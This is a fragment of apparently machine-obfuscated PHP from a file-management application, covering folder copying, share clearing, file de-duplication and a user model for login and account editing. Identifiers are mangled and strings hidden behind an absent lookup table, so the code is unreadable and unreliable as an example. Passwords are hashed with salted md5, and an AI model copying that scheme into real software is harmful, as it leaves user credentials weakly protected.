$Ø¨ãÆ÷[$Òš‰úà“[405]] == SourceModel::TYPE_GROUP && $ªãä½‹[$Òš‰úà“[498]] == $Ø¨ãÆ÷[$Òš‰úà“[498]]; if (!$¹ÔıÅÂ” && $this->moveClearAuth) { Model($Òš‰úà“[495])->authClear($ßÕÚƒÎ); } $ î´¬ğ¾ = $ªãä½‹[$Òš‰úà“[424]] == $Òš‰úà“[89] && $Ø¨ãÆ÷[$Òš‰úà“[424]] != $Òš‰úà“[89]; if ($ î´¬ğ¾) { $»™ÛŞ¤²[$Òš‰úà“[423]] = 0; } if ($øë§ÓË´) { $°âª”‚¦ = array($Òš‰úà“[580] => array($Òš‰úà“[540], $ªãä½‹[$Òš‰úà“[514]] . $ªãä½‹[$Òš‰úà“[396]] . $Òš‰úà“[541])); $‚«â¸Õ… = $ªãä½‹[$Òš‰úà“[514]] . $ªãä½‹[$Òš‰úà“[396]] . $Òš‰úà“[50]; $’úğ¿Ñ± = $Ø¨ãÆ÷[$Òš‰úà“[514]] . $Ø¨ãÆ÷[$Òš‰úà“[396]] . $Òš‰úà“[50] . $ªãä½‹[$Òš‰úà“[396]] . $Òš‰úà“[50]; $ê‹áÀ× = array($Òš‰úà“[580] => array($Òš‰úà“[589], "\x72\x65\x70\154\x61\x63\x65\x28\x70\141\162\145\x6e\x74\x4c\x65\x76\145\154\x2c\x27{$‚«â¸Õ…}\47\54\x27{$’úğ¿Ñ±}\47\51"), $Òš‰úà“[576] => $Ø¨ãÆ÷[$Òš‰úà“[405]], $Òš‰úà“[577] => $Ø¨ãÆ÷[$Òš‰úà“[498]]); if ($ î´¬ğ¾) { $ê‹áÀ×[$Òš‰úà“[423]] = 0; } $this->where($°âª”‚¦)->data($ê‹áÀ×)->save(); } $this->where(array($Òš‰úà“[411] => $ßÕÚƒÎ))->data($»™ÛŞ¤²)->save(); return $ßÕÚƒÎ; } private function clearShare($£íÄ¤È•, $€§­±Ïí) { $‹ÄÒÓêì =& $_SERVER[ê‘³Æ±]; $©ò°åş = $this->sourceInfo($£íÄ¤È•); $êñĞ²É¹ = $this->sourceInfo($€§­±Ïí); if ($©ò°åş[$‹ÄÒÓêì[498]] == $êñĞ²É¹[$‹ÄÒÓêì[498]] && $©ò°åş[$‹ÄÒÓêì[405]] == $‹ÄÒÓêì[590]) { return; } $¦ÏîÙî = array($‹ÄÒÓêì[514] => array($‹ÄÒÓêì[540], $©ò°åş[$‹ÄÒÓêì[514]] . $£íÄ¤È• . $‹ÄÒÓêì[541])); $€´¶‡©Û = $this->field($‹ÄÒÓêì[411])->where($¦ÏîÙî)->getField($‹ÄÒÓêì[396], !0); if (!$€´¶‡©Û) { return; } $¦ÏîÙî = array($‹ÄÒÓêì[396] => array($‹ÄÒÓêì[7], $€´¶‡©Û), $‹ÄÒÓêì[488] => 1); $˜›¦ÁŠç = Model($‹ÄÒÓêì[591])->field($‹ÄÒÓêì[481])->where($¦ÏîÙî)->select(); if (!$˜›¦ÁŠç) { return; } $˜›¦ÁŠç = array_to_keyvalue($˜›¦ÁŠç, $‹ÄÒÓêì[12], $‹ÄÒÓêì[481]); $¦ÏîÙî = array($‹ÄÒÓêì[481] => array($‹ÄÒÓêì[7], $˜›¦ÁŠç)); Model($‹ÄÒÓêì[591])->where($¦ÏîÙî)->save(array($‹ÄÒÓêì[488] => 0)); Model($‹ÄÒÓêì[592])->where($¦ÏîÙî)->delete(); } public function copyFolderFromIO($ï˜¾À°§, $Îó‰¡í, $¿È­´ºø, $‰²ß¿…, $²ıÊ­Ú, $±äªä²Ë = false) { $·áñìØ™ =& $_SERVER[ê‘³Æ±]; $Á×ŸáÛì = array($·áñìØ™[557] => array(), $·áñìØ™[558] => array(), $·áñìØ™[556] => array(), $·áñìØ™[593] => array()); $ÆÌ†ÔÚ = $±äªä²Ë ? $±äªä²Ë : $ï˜¾À°§->pathThis($Îó‰¡í); $—ƒÎûÅ = $this->fileNameExist($¿È­´ºø, $ÆÌ†ÔÚ); $÷â§ÂÈş = $this->mkdir($¿È­´ºø, $ÆÌ†ÔÚ, $‰²ß¿…); if (!$—ƒÎûÅ || $‰²ß¿… == REPEAT_RENAME_FOLDER) { $‰²ß¿… = !1; } if ($—ƒÎûÅ) { $this->_childrenAllMake($—ƒÎûÅ); } Hook::trigger($·áñìØ™[594]); $this->_copyChildTo($ï˜¾À°§, $Îó‰¡í, $÷â§ÂÈş, $‰²ß¿…, $Á×ŸáÛì, $²ıÊ­Ú); Hook::trigger($·áñìØ™[595]); if ($÷â§ÂÈş) { $this->folderSizeResetChildren($÷â§ÂÈş); } $this->_childrenListClear(); Model($·áñìØ™[559])->addAll($Á×ŸáÛì[$·áñìØ™[557]], array(), !0); Model($·áñìØ™[560])->eventCopy($÷â§ÂÈş); $this->saveAll($Á×ŸáÛì[$·áñìØ™[558]]); Model($·áñìØ™[463])->linkAdd($Á×ŸáÛì[$·áñìØ™[556]]); Model($·áñìØ™[463])->remove($Á×ŸáÛì[$·áñìØ™[593]]); $this->folderSizeReset($¿È­´ºø); $this->updateModifyTime($¿È­´ºø); return $÷â§ÂÈş; } private function _copyChildTo($äéşõÑ, $‰¦†©´, $äÆ”€ã, $îïøŒÊ, &$ ßŸêÖÛ, $‡°ƒÏıÉ) { $ºòÇİ”« =& $_SERVER[ê‘³Æ±]; $’üóª”± = $this->sourceInfoCache($äÆ”€ã); $÷à£˜¡ç = $äéşõÑ->listPath($‰¦†©´); $÷à£˜¡ç = $÷à£˜¡ç ? $÷à£˜¡ç : array($ºòÇİ”«[76] => array(), $ºòÇİ”«[77] => array()); $®åÖşøË = array_merge($÷à£˜¡ç[$ºòÇİ”«[76]], $÷à£˜¡ç[$ºòÇİ”«[77]]); $èÓİ„ÆÚ = $this->_addFiles($äéşõÑ, $÷à£˜¡ç[$ºòÇİ”«[76]], $‡°ƒÏıÉ); $êµŞ£ª™ = array(); foreach ($®åÖşøË as &$ªõ¸´Ü) { if (isset($èÓİ„ÆÚ[$ªõ¸´Ü[$ºòÇİ”«[32]]])) { $ªõ¸´Ü = $èÓİ„ÆÚ[$ªõ¸´Ü[$ºòÇİ”«[32]]]; } $ªõ¸´Ü[$ºòÇİ”«[404]] = $ªõ¸´Ü[$ºòÇİ”«[33]] == $ºòÇİ”«[79]; $ªõ¸´Ü[$ºòÇİ”«[406]] = _get($ªõ¸´Ü, $ºòÇİ”«[169], $ºòÇİ”«[12]); $ªõ¸´Ü[$ºòÇİ”«[80]] = _get($ªõ¸´Ü, $ºòÇİ”«[80], 0); $ªõ¸´Ü[$ºòÇİ”«[460]] = _get($ªõ¸´Ü, $ºòÇİ”«[460], 0); if (!isset($ªõ¸´Ü[$ºòÇİ”«[596]]) && $ªõ¸´Ü[$ºòÇİ”«[460]]) { $ ßŸêÖÛ[$ºòÇİ”«[593]][] = $ªõ¸´Ü[$ºòÇİ”«[460]]; } if ($îïøŒÊ) { $æ¨±í°’ = $this->fileNameExistCache($äÆ”€ã, $ªõ¸´Ü[$ºòÇİ”«[32]]); if ($æ¨±í°’) { if ($ªõ¸´Ü[$ºòÇİ”«[404]] || $îïøŒÊ == REPEAT_SKIP) { continue; } if ($îïøŒÊ == REPEAT_REPLACE) { $ïÏÈ®èˆ = $this->sourceInfoCache($æ¨±í°’); $†—·ãµÍ = $this->fileHistory($ïÏÈ®èˆ, $ªõ¸´Ü[$ºòÇİ”«[460]], $ªõ¸´Ü[$ºòÇİ”«[80]]); if ($†—·ãµÍ) { $ ßŸêÖÛ[$ºòÇİ”«[556]][] = $ªõ¸´Ü[$ºòÇİ”«[460]]; } continue; } else { if ($îïøŒÊ == REPEAT_RENAME) { $ªõ¸´Ü[$ºòÇİ”«[32]] = $this->fileNameAutoCache($äÆ”€ã, $ªõ¸´Ü[$ºòÇİ”«[32]], $îïøŒÊ, !1); } } } } if (!$ªõ¸´Ü[$ºòÇİ”«[404]] && $ªõ¸´Ü[$ºòÇİ”«[460]] == 0) { continue; } if (!$ªõ¸´Ü[$ºòÇİ”«[404]] && $ªõ¸´Ü[$ºòÇİ”«[460]]) { $ ßŸêÖÛ[$ºòÇİ”«[556]][] = $ªõ¸´Ü[$ºòÇİ”«[460]]; } $êµŞ£ª™[] = $this->_makeItemData($ªõ¸´Ü, $’üóª”±, $ªõ¸´Ü[$ºòÇİ”«[32]]); } unset($ªõ¸´Ü); if (!empty($êµŞ£ª™)) { $this->addAll($êµŞ£ª™); $this->_childrenListSelect($äÆ”€ã); } $ÛèÜóµœ = $this->_childrenList($äÆ”€ã); $ÛèÜóµœ = array_to_keyvalue($ÛèÜóµœ, $ºòÇİ”«[32]); foreach ($®åÖşøË as $ªõ¸´Ü) { $ïÏÈ®èˆ = $ÛèÜóµœ[$ªõ¸´Ü[$ºòÇİ”«[32]]]; $Ş°Ûù…± = $ïÏÈ®èˆ[$ºòÇİ”«[396]]; $this->_copyApplyMeta($ïÏÈ®èˆ, $ ßŸêÖÛ); if ($ªõ¸´Ü[$ºòÇİ”«[33]] == $ºòÇİ”«[79]) { $ªõ¸´Ü[$ºòÇİ”«[78]] = $äéşõÑ->getPathInner($ªõ¸´Ü[$ºòÇİ”«[78]]); $this->_copyChildTo($äéşõÑ, $ªõ¸´Ü[$ºòÇİ”«[78]], $Ş°Ûù…±, $îïøŒÊ, $ ßŸêÖÛ, $‡°ƒÏıÉ); } } } private function _addFiles($’Ø”×£ä, $…Ñê„£†, $³Âœá¯‚) { $ûÅá¹ß£ =& $_SERVER[ê‘³Æ±]; if (!$…Ñê„£† || count($…Ñê„£†) == 0) { return array(); } $’á½Œ‹Ò = array(); foreach ($…Ñê„£† as &$‰ Öà”) { Hook::trigger($ûÅá¹ß£[597], $‰ Öà”); $‰ Öà”[$ûÅá¹ß£[78]] = $’Ø”×£ä->getPathInner($‰ Öà”[$ûÅá¹ß£[78]]); $ù¨¢í† = $’Ø”×£ä->hashSimple($‰ Öà”[$ûÅá¹ß£[78]]); $º«ÉŞÖ = $’Ø”×£ä->hashMd5($‰ Öà”[$ûÅá¹ß£[78]]); if (strlen($º«ÉŞÖ) > 10 && !isset($’á½Œ‹Ò[$º«ÉŞÖ])) { $’á½Œ‹Ò[$º«ÉŞÖ] = array(); } $‰ Öà”[$ûÅá¹ß£[172]] = $ù¨¢í†; $‰ Öà”[$ûÅá¹ß£[171]] = $º«ÉŞÖ; Hook::trigger($ûÅá¹ß£[598], $‰ Öà”); $’á½Œ‹Ò[$º«ÉŞÖ][] =& $‰ Öà”; if (count($’á½Œ‹Ò[$º«ÉŞÖ]) > 1) { $‰ Öà”[$ûÅá¹ß£[596]] = !0; } } unset($‰ Öà”); $Àã…ë·ó = array($ûÅá¹ß£[171] => array($ûÅá¹ß£[7], array_keys($’á½Œ‹Ò))); $¤›ï¶½Ì = Model($ûÅá¹ß£[599]); $õ°÷Òá® = $¤›ï¶½Ì->where($Àã…ë·ó)->select(); $õ°÷Òá® = $õ°÷Òá® ? $õ°÷Òá® : array(); foreach ($õ°÷Òá® as $÷ºè¥Œ) { if (!isset($’á½Œ‹Ò[$÷ºè¥Œ[$ûÅá¹ß£[171]]])) { continue; } $ÅÚÖª» = $’á½Œ‹Ò[$÷ºè¥Œ[$ûÅá¹ß£[171]]]; foreach ($ÅÚÖª» as &$‰ Öà”) { $‰ Öà”[$ûÅá¹ß£[460]] = $÷ºè¥Œ[$ûÅá¹ß£[460]]; $‰ Öà”[$ûÅá¹ß£[596]] = !0; } unset($‰ Öà”); } $æöÚùã = array(); foreach ($…Ñê„£† as $¤ßÂÛé«) { if (isset($¤ßÂÛé«[$ûÅá¹ß£[596]]) && $¤ßÂÛé«[$ûÅá¹ß£[596]]) { continue; } $úÉÅÄ„’ = $’Ø”×£ä->getPathInner($¤ßÂÛé«[$ûÅá¹ß£[78]]); $„û˜Õ­ì = $¤›ï¶½Ì->addFileMake($úÉÅÄ„’, $¤ßÂÛé«[$ûÅá¹ß£[80]], $¤ßÂÛé«[$ûÅá¹ß£[172]], $¤ßÂÛé«[$ûÅá¹ß£[171]], $¤ßÂÛé«[$ûÅá¹ß£[32]], $³Âœá¯‚); if (!is_array($„û˜Õ­ì)) { continue; } $æöÚùã[] = $„û˜Õ­ì; } $¤›ï¶½Ì->addAll($æöÚùã); $Àã…ë·ó = array($ûÅá¹ß£[171] => array($ûÅá¹ß£[7], array_keys($’á½Œ‹Ò))); $õ°÷Òá® = $¤›ï¶½Ì->where($Àã…ë·ó)->select(); $õ°÷Òá® = $õ°÷Òá® ? $õ°÷Òá® : array(); foreach ($õ°÷Òá® as $÷ºè¥Œ) { if (!isset($’á½Œ‹Ò[$÷ºè¥Œ[$ûÅá¹ß£[171]]])) { continue; } $ûº—í”— =& $’á½Œ‹Ò[$÷ºè¥Œ[$ûÅá¹ß£[171]]]; foreach ($ûº—í”— as &$‰ Öà”) { $‰ Öà”[$ûÅá¹ß£[460]] = $÷ºè¥Œ[$ûÅá¹ß£[460]]; } unset($‰ Öà”); } $Ú™Òãü = array(); foreach ($…Ñê„£† as $œ”àŒ£) { $Ú™Òãü[$œ”àŒ£[$ûÅá¹ß£[32]]] = $œ”àŒ£; } return $Ú™Òãü; } } goto dÔÓ¶¿ÄŒ; a×ÎŠœ¡õ: class UserModel extends ModelBase { protected $tableName = "\165\x73\x65\162"; protected $tableMeta = array("\x74\x61\142\154\x65\116\141\155\x65" => "\165\163\x65\162\x5f\155\x65\164\x61", "\x6d\x65\164\141\x46\x69\x65\154\144" => "\x75\163\x65\162\x49\x44"); protected $simpleField = "\165\163\x65\162\x49\x44\x2c\x6e\x69\143\153\116\141\x6d\x65\54\156\x61\x6d\x65\54\141\166\x61\164\x61\x72\54\x73\x65\x78\54\163\164\x61\x74\165\163"; const ERROR_USER_NOT_EXISTS = -1; const ERROR_USER_PASSWORD_ERROR = -2; const ERROR_USER_EXIST_NAME = -3; const ERROR_USER_EXIST_PHONE = -4; const ERROR_USER_EXIST_EMAIL = -5; const ERROR_USER_LOGIN_LOCK = -6; const ERROR_IP_NOT_ALLOW = -7; const ERROR_USER_EXIST_NICKNAME = -8; protected function cacheFunctionAlias($³ŸÍÙØ) { $ÜÖ‘õ¶¼ =& $_SERVER[ê‘³Æ±]; $ÉØ°æ¨õ = $ÜÖ‘õ¶¼[2239]; return array($ÜÖ‘õ¶¼[1886] => array($³ŸÍÙØ[0], $ÉØ°æ¨õ), $ÜÖ‘õ¶¼[1888] => array($³ŸÍÙØ[0], $ÉØ°æ¨õ), $ÜÖ‘õ¶¼[2240] => array($³ŸÍÙØ[0], $ÉØ°æ¨õ)); } protected function getInfo($¥á¬·…µ, $†Áóø’ğ = false) { $œ”²’¹ = $this->getInfoSimple($¥á¬·…µ); if (!is_array($œ”²’¹)) { return array(); } if ($†Áóø’ğ) { return $this->_getInfoApply($œ”²’¹); } return $this->cacheFunctionGet($_SERVER[ê‘³Æ±][1890], $¥á¬·…µ); } protected function getInfoFull($—†¨ÍÙ‰, $—ç²ø¡ç = false) { $É¯¢õĞ = $this->getInfoSimple($—†¨ÍÙ‰); if (!is_array($É¯¢õĞ)) { return array(); } if ($—ç²ø¡ç) { return $this->_getInfoApply($É¯¢õĞ, !0); } return $this->cacheFunctionGet($_SERVER[ê‘³Æ±][2241], $—†¨ÍÙ‰); } private function _getInfoApply($çœ’°, $Öæ¯ö÷ = false) { $ùéÆè¿ =& $_SERVER[ê‘³Æ±]; if (!$çœ’°) { return $çœ’°; } $Ï˜àêíº = md5($ùéÆè¿[2242] . $çœ’°[$ùéÆè¿[878]] . $ùéÆè¿[2243] . $çœ’°[$ùéÆè¿[32]]); $çœ’° = $this->_listDataApplyItem($çœ’°); $—ßü¸‰¢ = Model($ùéÆè¿[1314])->metaGet($çœ’°[$ùéÆè¿[87]][$ùéÆè¿[396]]); $çœ’°[$ùéÆè¿[2244]] = $Ï˜àêíº; $çœ’°[$ùéÆè¿[87]][$ùéÆè¿[2072]] = isset($—ßü¸‰¢[$ùéÆè¿[2073]]) ? $—ßü¸‰¢[$ùéÆè¿[2073]] : null; if ($Öæ¯ö÷) { $çœ’°[$ùéÆè¿[458]] = $this->metaGet($çœ’°[$ùéÆè¿[1641]]); } return $çœ’°; } protected function getInfoSimple($ºÂ¼¤äÁ, $„…ƒİ‡» = false) { $î¿×ŸÅÊ =& $_SERVER[ê‘³Æ±]; if (!$ºÂ¼¤äÁ) { return array(); } if ($„…ƒİ‡») { $€•—Õ¼à = $this->where(array($î¿×ŸÅÊ[1641] => intval($ºÂ¼¤äÁ)))->find(); if (!is_array($€•—Õ¼à)) { return array(); } $€•—Õ¼à[$î¿×ŸÅÊ[532]] = Action($î¿×ŸÅÊ[2245])->parseUrl($€•—Õ¼à[$î¿×ŸÅÊ[532]]); return $€•—Õ¼à; } return $this->cacheFunctionGet($î¿×ŸÅÊ[1891], $ºÂ¼¤äÁ); } protected function getInfoSimpleOuter($áåõ™íù) { $è…¨€ŒÌ =& $_SERVER[ê‘³Æ±]; if (!$áåõ™íù || $áåõ™íù == 0) { return array($è…¨€ŒÌ[1641] => $è…¨€ŒÌ[192], $è…¨€ŒÌ[32] => $è…¨€ŒÌ[161] . LNG($è…¨€ŒÌ[2246]) . $è…¨€ŒÌ[529], $è…¨€ŒÌ[532] => STATIC_PATH . $è…¨€ŒÌ[2247]); } $”‡Ö§Ş£ = $this->cacheFunctionGet($è…¨€ŒÌ[1891], $áåõ™íù); $Ü¨íÖ˜¿ = array_field_key($”‡Ö§Ş£, explode($è…¨€ŒÌ[50], $this->simpleField)); if (!$Ü¨íÖ˜¿) { return array($è…¨€ŒÌ[1641] => $è…¨€ŒÌ[1177], $è…¨€ŒÌ[32] => $è…¨€ŒÌ[161] . LNG($è…¨€ŒÌ[2248]) . $è…¨€ŒÌ[529], $è…¨€ŒÌ[532] => STATIC_PATH . $è…¨€ŒÌ[2249]); } $Ü¨íÖ˜¿[$è…¨€ŒÌ[532]] = Action($è…¨€ŒÌ[2245])->parseUrl($Ü¨íÖ˜¿[$è…¨€ŒÌ[532]]); return $Ü¨íÖ˜¿; } protected function groupUser($”õŞïÙ) { } public static function errorLang($İª ±×) { $ô¾âİÎ’ =& $_SERVER[ê‘³Æ±]; $ÒÖÊ¼ê = array(self::ERROR_USER_NOT_EXISTS => $ô¾âİÎ’[2250], self::ERROR_USER_PASSWORD_ERROR => $ô¾âİÎ’[2251], self::ERROR_USER_EXIST_NAME => $ô¾âİÎ’[2252], self::ERROR_USER_EXIST_PHONE => $ô¾âİÎ’[2253], self::ERROR_USER_EXIST_EMAIL => $ô¾âİÎ’[2254], self::ERROR_USER_LOGIN_LOCK => $ô¾âİÎ’[2255], self::ERROR_IP_NOT_ALLOW => $ô¾âİÎ’[2256], self::ERROR_USER_EXIST_NICKNAME => $ô¾âİÎ’[2257]); return LNG($ÒÖÊ¼ê[$İª ±×]); } public function getInfoByMeta($’ø³ğ¢, $¡àø¾„) { $È…Á·ó€ =& $_SERVER[ê‘³Æ±]; $‡šõıÕÍ = Model($È…Á·ó€[2258])->where(array($È…Á·ó€[95] => $’ø³ğ¢, $È…Á·ó€[371] => $¡àø¾„))->find(); if ($‡šõıÕÍ) { return $this->getInfo($‡šõıÕÍ[$È…Á·ó€[1641]]); } return !1; } public function userLoginCheck($Í†µ—, $äµöˆ«ß) { $äè¯¹‘¢ =& $_SERVER[ê‘³Æ±]; $Ïøû—Âù = $this->userLoginFind($Í†µ—); if (!$Ïøû—Âù) { return UserModel::ERROR_USER_NOT_EXISTS; } if (!$this->userPasswordCheck($Ïøû—Âù[$äè¯¹‘¢[1641]], $äµöˆ«ß)) { return UserModel::ERROR_USER_PASSWORD_ERROR; } return $this->getInfo($Ïøû—Âù[$äè¯¹‘¢[1641]]); } public function userLoginFind($Àı¶úØ) { $­ØıÏ‚Ï =& $_SERVER[ê‘³Æ±]; $´ûù±ÃÜ = array($­ØıÏ‚Ï[32] => $Àı¶úØ, $­ØıÏ‚Ï[531] => $Àı¶úØ, $­ØıÏ‚Ï[302] => $Àı¶úØ, $­ØıÏ‚Ï[2259] => $Àı¶úØ, $­ØıÏ‚Ï[989] => $­ØıÏ‚Ï[991]); if ($this->nickNameRpt()) { unset($´ûù±ÃÜ[$­ØıÏ‚Ï[531]]); } return $this->where($´ûù±ÃÜ)->find(); } public function clearCache($´óË¬µ) { $Ë£›Ò¿½ =& $_SERVER[ê‘³Æ±]; $this->cacheFunctionClear($Ë£›Ò¿½[1890], $´óË¬µ); $this->cacheFunctionClear($Ë£›Ò¿½[1891], $´óË¬µ); $this->cacheFunctionClear($Ë£›Ò¿½[2241], $´óË¬µ); } public function userPasswordCheck($Ÿª¦ö‰‘, $ªúĞê¢Š) { $ÌªøÆ” =& $_SERVER[ê‘³Æ±]; $…Œˆ ‹× = $this->where(array($ÌªøÆ”[1641] => intval($Ÿª¦ö‰‘)))->find(); $ö„Âè¶¡ = $this->metaGet($Ÿª¦ö‰‘); $ÉøóşÅ€ = isset($ö„Âè¶¡[$ÌªøÆ”[2260]]) ? $ö„Âè¶¡[$ÌªøÆ”[2260]] : $ÌªøÆ”[12]; if (md5($ÉøóşÅ€ . trim($ªúĞê¢Š)) !== $…Œˆ ‹×[$ÌªøÆ”[878]]) { return !1; } return !0; } public function userAdd($Èúß›óÜ) { $Ÿ—ä¬‘ª =& $_SERVER[ê‘³Æ±]; $Ü’¾¹ƒö = array($Ÿ—ä¬‘ª[414] => $Èúß›óÜ[$Ÿ—ä¬‘ª[32]], $Ÿ—ä¬‘ª[2261] => $Èúß›óÜ[$Ÿ—ä¬‘ª[1521]], $Ÿ—ä¬‘ª[2262] => isset($Èúß›óÜ[$Ÿ—ä¬‘ª[302]]) ? $Èúß›óÜ[$Ÿ—ä¬‘ª[302]] : $Ÿ—ä¬‘ª[12], $Ÿ—ä¬‘ª[2263] => isset($Èúß›óÜ[$Ÿ—ä¬‘ª[2259]]) ? $Èúß›óÜ[$Ÿ—ä¬‘ª[2259]] : $Ÿ—ä¬‘ª[12], $Ÿ—ä¬‘ª[2264] => isset($Èúß›óÜ[$Ÿ—ä¬‘ª[531]]) ? $Èúß›óÜ[$Ÿ—ä¬‘ª[531]] : $Èúß›óÜ[$Ÿ—ä¬‘ª[32]], $Ÿ—ä¬‘ª[2265] => isset($Èúß›óÜ[$Ÿ—ä¬‘ª[532]]) ? $Èúß›óÜ[$Ÿ—ä¬‘ª[532]] : $Ÿ—ä¬‘ª[12], $Ÿ—ä¬‘ª[2266] => isset($Èúß›óÜ[$Ÿ—ä¬‘ª[2267]]) ? $Èúß›óÜ[$Ÿ—ä¬‘ª[2267]] : 1, $Ÿ—ä¬‘ª[2268] => $Èúß›óÜ[$Ÿ—ä¬‘ª[878]], $Ÿ—ä¬‘ª[1892] => isset($Èúß›óÜ[$Ÿ—ä¬‘ª[1796]]) ? $Èúß›óÜ[$Ÿ—ä¬‘ª[1796]] : 1024 * 1024 * 20, $Ÿ—ä¬‘ª[1893] => 0, $Ÿ—ä¬‘ª[2269] => 0, $Ÿ—ä¬‘ª[1933] => isset($Èúß›óÜ[$Ÿ—ä¬‘ª[736]]) ? $Èúß›óÜ[$Ÿ—ä¬‘ª[736]] : 1); if (!empty($Èúß›óÜ[$Ÿ—ä¬‘ª[1641]])) { $Ü’¾¹ƒö[$Ÿ—ä¬‘ª[1641]] = $Èúß›óÜ[$Ÿ—ä¬‘ª[1641]]; } $àÙ”â  = $this->_checkExist($Èúß›óÜ); if ($àÙ”â  !== !0) { return $àÙ”â ; } if (!empty($Ü’¾¹ƒö[$Ÿ—ä¬‘ª[532]]) && strlen($Ü’¾¹ƒö[$Ÿ—ä¬‘ª[532]]) > 255) { $Ü’¾¹ƒö[$Ÿ—ä¬‘ª[532]] = $Ÿ—ä¬‘ª[12]; } $¦’¨çúğ = $this->add($Ü’¾¹ƒö); $¸øŸ¢Î  = array($Ÿ—ä¬‘ª[2268] => $Ü’¾¹ƒö[$Ÿ—ä¬‘ª[878]], $Ÿ—ä¬‘ª[2264] => $Ü’¾¹ƒö[$Ÿ—ä¬‘ª[531]]); $this->userEdit($¦’¨çúğ, $¸øŸ¢Î ); Model($Ÿ—ä¬‘ª[1314])->userRootAdd($¦’¨çúğ); return $¦’¨çúğ; } protected function userEditTest($©©Íô…ö, $”ñĞ¦é¼) { return $this->call($_SERVER[ê‘³Æ±][2270], $©©Íô…ö, $”ñĞ¦é¼); } protected function userEdit($¼¬î¶Ÿç, $¼™É‡ÊÈ) { $·¶šØè› =& $_SERVER[ê‘³Æ±]; $¼™Á—³² = $this->getInfoSimple($¼¬î¶Ÿç); if (!$¼™Á—³²) { return !1; } $Ïû™ş“Ë = $this->_checkExist($¼™É‡ÊÈ, $¼¬î¶Ÿç); if ($Ïû™ş“Ë !== !0) { return $Ïû™ş“Ë; } if (isset($¼™É‡ÊÈ[$·¶šØè›[878]]) && trim($¼™É‡ÊÈ[$·¶šØè›[878]]) != $·¶šØè›[12]) { $‹…Ì¿õŠ = $this->metaGet($¼¬î¶Ÿç); if (empty($‹…Ì¿õŠ[$·¶šØè›[2260]])) { $‹…Ì¿õŠ[$·¶šØè›[2260]] = rand_string(10); Model($·¶šØè›[506])->metaSet($¼¬î¶Ÿç, $·¶šØè›[2260], $‹…Ì¿õŠ[$·¶šØè›[2260]]); } $¼™É‡ÊÈ[$·¶šØè›[878]] = md5($‹…Ì¿õŠ[$·¶šØè›[2260]] . trim($¼™É‡ÊÈ[$·¶šØè›[878]])); } else { unset($¼™É‡ÊÈ[$·¶šØè›[878]]); } if (!empty($¼™É‡ÊÈ[$·¶šØè›[532]]) && strlen($¼™É‡ÊÈ[$·¶šØè›[532]]) > 255) { $¼™É‡ÊÈ[$·¶šØè›[532]] = $·¶šØè›[12]; } $this->where(array($·¶šØè›[1632] => $¼¬î¶Ÿç))->save($¼™É‡ÊÈ); if (isset($¼™É‡ÊÈ[$·¶šØè›[531]])) { $this->setNamePinyin($¼¬î¶Ÿç, $¼™É‡ÊÈ[$·¶šØè›[531]]); } $this->clearCache($¼¬î¶Ÿç); return !0; } public function setNamePinyin($€”Á¬Öí, $Ø³Á¯ÑÉ = false) { $ÏãŞ Â¡ =& $_SERVER[ê‘³Æ±]; if (!$Ø³Á¯ÑÉ) { $²ô—ö÷ñ = $this->getInfoSimple($€”Á¬Öí); $Ø³Á¯ÑÉ = $²ô—ö÷ñ[$ÏãŞ Â¡[531]] ? $²ô—ö÷ñ[$ÏãŞ Â¡[531]] : $²ô—ö÷ñ[$ÏãŞ Â¡[32]]; } $½µ‘‡ç = Model($ÏãŞ Â¡[534]); if (!Input::check($Ø³Á¯ÑÉ, $ÏãŞ Â¡[583])) { return $½µ‘‡ç->metaSet($€”Á¬Öí, array($ÏãŞ Â¡[457] => $ÏãŞ Â¡[12], $ÏãŞ Â¡[456] => $ÏãŞ Â¡[12])); } return $½µ‘‡ç->metaSet($€”Á¬Öí, array($ÏãŞ Â¡[457] => str_replace($ÏãŞ Â¡[53], $ÏãŞ Â¡[12], Pinyin::get($Ø³Á¯ÑÉ)), $ÏãŞ Â¡[456] => Pinyin::get($Ø³Á¯ÑÉ, $ÏãŞ Â¡[584]))); } private function nickNameRpt() { $‘¤îæü³ =& $_SERVER[ê‘³Æ±]; $¿Õ©¥©Ã = Model($‘¤îæü³[756])->get($‘¤îæü³[2271]); $ç§‡ª£ç = $GLOBALS[$‘¤îæü³[6]][$‘¤îæü³[378]][$‘¤îæü³[2271]]; $Øå¥Òó = !is_null($¿Õ©¥©Ã) ? $¿Õ©¥©Ã : $ç§‡ª£ç; return !!$Øå¥Òó; } private function _checkExist($éÄ·ÜŒ±, $ù·ÈÇ = false) { $“ÚûÊôÅ =& $_SERVER[ê‘³Æ±]; $íØúÌî˜ = array($“ÚûÊôÅ[32] => UserModel::ERROR_USER_EXIST_NAME, $“ÚûÊôÅ[531] => UserModel::ERROR_USER_EXIST_NICKNAME, $“ÚûÊôÅ[302] => UserModel::ERROR_USER_EXIST_EMAIL, $“ÚûÊôÅ[2259] => UserModel::ERROR_USER_EXIST_PHONE); if ($this->nickNameRpt()) { unset($íØúÌî˜[$“ÚûÊôÅ[531]]); } $½Ò–±•Ë = $ù·ÈÇ ? array($“ÚûÊôÅ[1641] => array($“ÚûÊôÅ[2272], $ù·ÈÇ)) : array(); foreach ($íØúÌî˜ as $Ãª¨×š => $åí ªĞ) { $Ô¡‚ÑŞÜ = array(); foreach ($íØúÌî˜ as $½¶Û¢§Â => $ê¢ëÕƒ) { if (isset($éÄ·ÜŒ±[$½¶Û¢§Â]) && $éÄ·ÜŒ±[$½¶Û¢§Â]) { $Ô¡‚ÑŞÜ[] = $éÄ·ÜŒ±[$½¶Û¢§Â]; } } if (!$Ô¡‚ÑŞÜ) { continue; } $Á¨º›¾ = array_merge(array($Ãª¨×š => array($“ÚûÊôÅ[7], $Ô¡‚ÑŞÜ)), $½Ò–±•Ë); $ı¯“Õ´ = $this->where($Á¨º›¾)->find(); if ($ı¯“Õ´) { return $åí ªĞ; } } return !0; } public function userListInfo($ç÷µ®Ó) { $°Çá‚ö =& $_SERVER[ê‘³Æ±]; $ÅŞåÎä = array(); $ç÷µ®Ó = is_array($ç÷µ®Ó) ? array_unique($ç÷µ®Ó) : array(); if (!$ç÷µ®Ó) { return $ÅŞåÎä; } if (count($ç÷µ®Ó) < 20) { foreach ($ç÷µ®Ó as $×óÅ–éŞ) { $ÅŞåÎä[$×óÅ–éŞ . $°Çá‚ö[12]] = $this->getInfoSimpleOuter($×óÅ–éŞ); } } else { $šçØŞ¹Ü = array($°Çá‚ö[1632] => array($°Çá‚ö[412], $ç÷µ®Ó)); if (count($ç÷µ®Ó) == 1) { $šçØŞ¹Ü = array($°Çá‚ö[1632] => $ç÷µ®Ó[0]); } $ É«†¾— = 